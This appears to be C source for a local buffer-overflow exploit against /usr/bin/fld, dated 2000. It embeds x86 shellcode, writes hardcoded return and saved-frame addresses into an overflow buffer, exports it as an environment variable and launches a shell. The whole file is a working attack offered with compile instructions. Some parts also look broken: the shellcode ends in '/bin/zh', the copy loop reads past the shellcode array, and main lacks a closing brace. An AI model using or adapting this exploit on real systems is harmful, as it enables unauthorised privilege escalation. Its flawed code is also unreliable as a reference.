/* Exploit code for /usr/bin/fld
  
   Compile with : gcc -o xp xp.c
   
   Made by : E-Ligth (Hugo Oliveira Dias) 01/08/2000 
*/


 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>

 #define OFFSET 0
 #define BUFFSIZE 541
 #define NOP 0x90

 char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/zh";

 unsigned long get_esp(void) {
    __asm__("movl %esp,%eax");
 }

 int main(int argc,char *argv[])
 {
   int bsize = BUFFSIZE;
   int offset = OFFSET;
  int i;
   long *addr_ptr, addr;
   char *ptr,*buf,*env;
   char arg[30];

  if (!(buf = malloc(bsize))) {
      printf("Can't allocate memory.\n"); 
      exit(0);
   }
 
 
  ptr = buf;
  for (i = 0; i < bsize; i++)
 
     *(ptr++) = shellcode[i];
   
  buf[519] = 0x3c; /* Saved EBP 0xbffffa3c */ 
  buf[520] = 0xfa;
  buf[521] = 0xff;
  buf[522] = 0xbf;
 
  buf[523] = 0x10; /* Return Address  0xbffff710 */ 
  buf[524] = 0xf7;
  buf[525] = 0xff;
  buf[526] = 0xbf;
    
  buf[527] = 0x90; /* fp variable 0x804bf90 */
  buf[528] = 0xbf;
  buf[529] = 0x04;
  buf[530] = 0x08;
 
  buf[531] = 0xef; /* variable thats shouldn�t be destroyed 0xbffffbef */
  buf[532] = 0xfb;  
  buf[533] = 0xff;
  buf[534] = 0xbf;
    
  buf[535] = 0x60; /* variable thats shouldn�t be destroyed 0x40013460 */
  buf[536] = 0x34;
  buf[537] = 0x01;
  buf[538] = 0x40;
   
  memcpy(buf,"-type \"",7);
  buf[540] = '\0';
  buf[539] = '\"';
 
  memcpy(arg,"-type bdf ./code",16);
  arg[16] = '\0';   
 
  env = (char *) malloc(bsize + 10);
  memcpy(env,"EGG=",4);
 
  strcat(env,buf);
 
  putenv(env);
 
  system("/bin/bash");
 
   exit(0);